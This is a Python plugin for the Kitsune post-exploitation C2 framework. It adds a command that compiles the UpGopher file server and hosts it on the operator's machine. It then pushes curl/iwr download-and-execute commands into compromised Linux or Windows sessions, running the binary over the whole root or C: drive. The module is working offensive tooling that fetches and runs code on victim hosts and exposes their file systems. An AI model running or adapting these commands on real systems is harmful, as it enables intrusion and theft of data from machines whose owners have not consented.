#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#      darkbyte.net       #
#=========================#

import os
import sys
import time
import json
import atexit
import threading
import subprocess

sys.dont_write_bytecode = True

def get_description():
    return "This module adds UpGopher to custom commands"

def compile_upgopher():
    try:
        subprocess.run('cd custom/upgopher/ && go build upgopher.go > /dev/null 2>&1', shell=True, check=True)
        subprocess.run('cd custom/upgopher/ && env GOOS=windows GOARCH=amd64 go build upgopher.go > /dev/null 2>&1', shell=True, check=True)
    except:
        return False
    return True

def compile_upgopher_thread():
    compile_thread = threading.Thread(target=compile_upgopher)
    compile_thread.start()

def check_upgopher_exists():
    linux_path = "custom/upgopher/upgopher"
    windows_path = "custom/upgopher/upgopher.exe"    
    if not (os.path.exists(linux_path) and os.path.exists(windows_path)):
        compile_upgopher_thread()
        return False
    return True

def main(app, caller, session, title, command):
    session = str(session).replace(".!","")
    if caller == "command" and command == "help":
        return "- upgopher: Execute UpGopher on current session and return URL:PORT"

    if caller == "command" and command == "upgopher":
        initial_check = check_upgopher_exists()
        if not initial_check:
            return "print: '[+] Loading Custom Module: UpGopher\n[+] First time execution detected! Compiling UpGopher, please wait..'"

        else:
            def get_localip():
                try:
                    result = subprocess.run(
                        ["ip", "a"], capture_output=True, text=True, check=True
                    )
                    lines = result.stdout.splitlines()
                    for line in lines:
                        if "inet " in line and "127.0.0.1" not in line and "inet6" not in line:
                            ipaddr = line.split()[1].split('/')[0]
                            return ipaddr
                except:
                    pass

                return None

            def get_ipaddress(title):
                try:
                    with open('data/sessions.json', 'r') as f:
                        sessions = json.load(f)
                        for session_id in sessions:
                            if int(session_id['Session']) == int(session_name):
                                session_ip = session_id['IP Address']
                                return session_ip
                except:
                    pass

            def get_type(title):

                try:
                    with open('data/sessions.json', 'r') as f:
                        sessions = json.load(f)
                        for session_id in sessions:
                            session_name = str(title.split("Session")[1]).strip()
                            if int(session_id['Session']) == int(session_name):
                                return session_id['Process']
                except:
                    pass

            def run_delivery(app, port, path):
                command = [os.sys.executable, '-m', 'http.server', '--bind', "0.0.0.0", '-d', path, str(port)]
                return subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

            def delivery_thread(app, port, path):
                app.tmp_delivery_process = run_delivery(app, port, path)
                return app.tmp_delivery_process

            def delayed_steps(app):
                while True:
                    try:
                        current_step = 0
                        local_ip = get_localip()
                        session_type = get_type(title)
                        print(session_type)

                        if not ".exe" in session_type:
                            custom_step1 = f'remote: curl -s http://{local_ip}:55555/upgopher -o /tmp/upgopher'
                            custom_step2 = 'remote: echo "sleep 3 ; chmod +x /tmp/upgopher ; /tmp/upgopher -dir \"/\"" > /tmp/upgopher.sh'
                            custom_step3 = 'remote: chmod +x /tmp/upgopher.sh ; nohup /bin/sh -c /tmp/upgopher.sh &'
                        else:
                            custom_step1 = f'remote: sleep 3 ; iwr -useb http://{local_ip}:55555/upgopher.exe -outfile "$env:temp\\upgopher.exe"'
                            custom_step2 = 'remote: Unblock-File "$env:temp\\upgopher.exe" 2>&1> $null'
                            custom_step3 = 'remote: start powershell "$env:temp\\upgopher.exe -dir C:/"'

                        delivery_thread_instance = threading.Thread(target=delivery_thread, args=(app, "55555", "custom/upgopher/"))
                        delivery_thread_instance.daemon = True
                        delivery_thread_instance.start()

                        steps = [
                            'print: "[+] Loading Custom Module: UpGopher"',
                            'print: "- Step 1: Build Go Solution.. OK!"',
                            custom_step1,
                            custom_step2,
                            custom_step3,
                            'print: "- Step 2: Transfer UpGopher.. OK!"',
                            'print: "- Step 3: Run UpGopher on remote session.. OK!"',
                            'stop:'
                        ]

                        for step in steps:
                            print(step)
                            time.sleep(3)
                            current_step += 1

                            if "stop" in step:
                                session_ip = get_ipaddress(title)
                                if session_ip:
                                    return (f"print: '[+] Done! You can access UpGopher on http://{session_ip}:9090'")
                                else:
                                    return ("print: [!] Error: Could not retrieve session IP address")

                                if app.tmp_delivery_process:
                                    app.tmp_delivery_process.terminate()
                                return step

                    except Exception as e:
                        return (f"print: [!] Error during execution: {str(e)}")
                        if app.tmp_delivery_process:
                            app.tmp_delivery_process.terminate()

                return step
            threading.Thread(target=delayed_steps, args=(app,)).start()

    return None
